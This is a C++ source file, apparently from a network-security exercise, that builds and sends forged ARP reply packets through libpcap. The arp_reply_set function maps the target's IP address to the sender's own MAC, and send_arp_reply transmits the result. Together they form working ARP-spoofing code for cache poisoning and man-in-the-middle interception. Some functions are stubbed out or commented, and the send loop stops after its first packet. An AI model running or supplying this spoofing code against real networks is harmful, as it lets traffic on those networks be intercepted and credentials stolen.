#include "generate_packet.h"
#include "libnet-headers.h"
#include <cstdio>
#include <vector>
#include <cstring>
generate_packet::generate_packet(int pack_count)
{
    printf("pack count %d \n\n",pack_count);
    arp_spoof_num = pack_count;//packet number
    arp_spoof_pack.resize(arp_spoof_num);
    for(int i =0;i<arp_spoof_num;i++){
        arp_spoof_pack[i].resize(LIBNET_ETH_H + LIBNET_ARP_ETH_IP_H);//that need heap mem del?
    }
}
void generate_packet :: arp_reply_set(packet_info& pack_info){
    for(int i =0;i<arp_spoof_num;i++){

        libnet_ethernet_hdr * ether_hdr_part = (libnet_ethernet_hdr * )&arp_spoof_pack[i][0];

        memcpy(ether_hdr_part->ether_dhost,&pack_info.sender_mac[i][0],ETHER_ADDR_LEN);
        memcpy(ether_hdr_part->ether_shost,&pack_info.my_mac,ETHER_ADDR_LEN);
        ether_hdr_part->ether_type =htons(ETHERTYPE_ARP);

        libnet_arp_hdr * arp_hdr_part = (libnet_arp_hdr *)&arp_spoof_pack[i][LIBNET_ETH_H];
        arp_hdr_part->ar_hrd = htons(ARPHRD_ETHER);
        arp_hdr_part->ar_pro = htons(ETHERTYPE_IP);
        arp_hdr_part->ar_hln = 6;
        arp_hdr_part->ar_pln = 4;
        arp_hdr_part->ar_op = htons(ARPOP_REPLY);
        printf("make pack %d \n\n",i);

        arp_header_ip * arp_ip_part = (arp_header_ip *)&arp_spoof_pack[i][LIBNET_ETH_H + LIBNET_ARP_H];
        memcpy(arp_ip_part->src_mac,&pack_info.my_mac,ETHER_ADDR_LEN);
        memcpy(&arp_ip_part->src_ip,&pack_info.target_ip[i],sizeof(uint32_t));
        memcpy(arp_ip_part->dst_mac,&pack_info.sender_mac[i][0],ETHER_ADDR_LEN);
        memcpy(&arp_ip_part->dst_ip,&pack_info.sender_ip[i],sizeof(uint32_t));

    }
}
void generate_packet :: send_arp_reply(pcap_t * pack_d,int num)
{
    printf("\npacket_data_now! : \n");
 /*   for(int i=0;i<num;i++){
        for(int j=0;j<42;j++){
            printf(" %02x ",arp_spoof_pack[i][j]);
        }
    printf("\n");
    }*/

    //printf("sizeof array!! %d\n",arp_spoof_pack[].size());
    if(num != 0){
        if(pcap_sendpacket(pack_d,&arp_spoof_pack[num][0],arp_spoof_pack[num].size()) !=0){
            pcap_perror(pack_d,"packet send error\n\n");
        }
            return;
    }
    else{
        for(int i=0;i<arp_spoof_num;i++){
            if(pcap_sendpacket(pack_d,&arp_spoof_pack[i][0],arp_spoof_pack[i].size()) !=0)
                pcap_perror(pack_d,"packet send error\n\n");
            printf("varity packet sended\n\n");
            return;
        }
    }


}
/*void generate_packet :: set_mac_adrs(char **param_ip)
{

    my_mac;

    sender_mac;

    target_mac;

    }
void generate_packet :: set_ip_adrs(char **param_ip)
{
    my_ip;
    sender_ip;
    target_ip;

    }
*/
/*void  generate_packet :: send_arp_packet(pcap_t *pack_d)
{
    //printf("size of packet %d\n\n",sizeof(arp_req_buf));
   // printf("%p\n\n",arp_req_buf);
    //int result =;

}*/
